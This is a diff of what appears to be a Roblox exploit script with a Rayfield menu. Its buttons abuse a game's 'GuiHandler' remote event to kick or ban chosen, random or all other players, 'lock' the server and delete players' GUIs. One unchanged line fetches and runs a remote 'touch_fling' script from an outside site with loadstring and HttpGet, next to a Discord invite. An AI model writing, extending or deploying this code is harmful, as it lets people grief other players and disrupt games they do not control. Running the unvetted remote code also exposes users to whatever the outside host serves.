@@ -26,7 +26,6 @@ game:GetService("Players").PlayerAdded:Connect(function(plr)
         game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, plr)
     end
     if table.find(blacklists, plr.Name) then
-        if locked == true then
         game.StarterGui:SetCore("SendNotification",{ -- reassurance
         Title = plr.Name.." tried to join.";
         Text = "That player is banned.";
@@ -34,7 +33,6 @@ game:GetService("Players").PlayerAdded:Connect(function(plr)
         })
         game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, plr)
     end
-end
 end)
 
 Rayfield:Notify({
@@ -210,8 +208,17 @@ local Section = Tab:CreateSection("Individual Kick & Ban Options")
 
 local plre
 
+local Input = Tab:CreateInput({
+   Name = "Player!",
+   PlaceholderText = "Player",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+    plre = Text
+   end,
+})
+
 local All = Tab:CreateButton({
-   Name = "Kick Player",
+   Name = "Kick Player!",
    Callback = function()
    for _,v in pairs(game:GetService("Players"):GetPlayers()) do
        if v.Name == plre then
@@ -222,7 +229,7 @@ local All = Tab:CreateButton({
 })
 
 local All = Tab:CreateButton({
-   Name = "Ban Player",
+   Name = "Ban Player!",
    Callback = function()
    for _,v in pairs(game:GetService("Players"):GetPlayers()) do
        if v.Name == plre then
@@ -233,19 +240,24 @@ local All = Tab:CreateButton({
    end,
 })
 
-local Input = Tab:CreateInput({
-   Name = "Player to Kick",
-   PlaceholderText = "Player",
-   RemoveTextAfterFocusLost = false,
-   Callback = function(Text)
-    plre = Text
+
+local All = Tab:CreateButton({
+   Name = "Get Bans!",
+   Callback = function()
+   for _,v in pairs(blacklists) do
+        game.StarterGui:SetCore("SendNotification",{ --waaw
+            Title = "Banned Player";
+             Text = v;
+            Duration = 5;
+     })
+    end
    end,
 })
 
 local Section = Tab:CreateSection("Multiple Kick & Ban Options")
 
 local All = Tab:CreateButton({
-   Name = "Kick All Players",
+   Name = "Kick All Players!",
    Callback = function()
    for _,v in pairs(game:GetService("Players"):GetPlayers()) do
        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
@@ -254,7 +266,7 @@ local All = Tab:CreateButton({
 })
 
 local All = Tab:CreateButton({
-   Name = "Kick Other Players",
+   Name = "Kick Other Players!",
    Callback = function()
    for _,v in pairs(game:GetService("Players"):GetPlayers()) do
        if v.Name == game:GetService("Players").LocalPlayer.Name then
@@ -266,7 +278,7 @@ local All = Tab:CreateButton({
    end,
 })
 local All = Tab:CreateButton({
-   Name = "Kick a Random Player",
+   Name = "Kick a Random Player!",
    Callback = function()
    local ama = game:GetService("Players"):GetPlayers()
    game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, ama[math.random(#ama)])
@@ -276,14 +288,14 @@ local All = Tab:CreateButton({
 local Section = Tab:CreateSection("Lock Options")
 
 local All = Tab:CreateButton({
-   Name = "Lock Server",
+   Name = "Lock Server!",
    Callback = function()
    locked = true
    end,
 })
 
 local All = Tab:CreateButton({
-   Name = "Unlock Server",
+   Name = "Unlock Server!",
    Callback = function()
    locked = false
    end,
@@ -292,7 +304,7 @@ local All = Tab:CreateButton({
 local Section = Tab:CreateSection("GUI Options")
 
 local All = Tab:CreateButton({
-   Name = "Delete all GUIs",
+   Name = "Delete all GUIs!",
    Callback = function()
    for _,v in pairs(game:GetDescendants()) do
        if v:IsA("ScreenGui") then
@@ -321,18 +333,5 @@ local All = Tab:CreateButton({
    -- -> discord.gg/G4nhhKFyyw <-
     _G.KeyCode = "X"
     loadstring(game:HttpGet("https://shattered-gang.lol/scripts/fe/touch_fling.lua"))()
-   end,
-})
-
-local All = Tab:CreateButton({
-   Name = "Get Bans",
-   Callback = function()
-   for _,v in pairs(blacklists) do
-        game.StarterGui:SetCore("SendNotification",{ --waaw
-            Title = "Banned Player";
-             Text = v;
-            Duration = 5;
-     })
-    end
    end,
 })
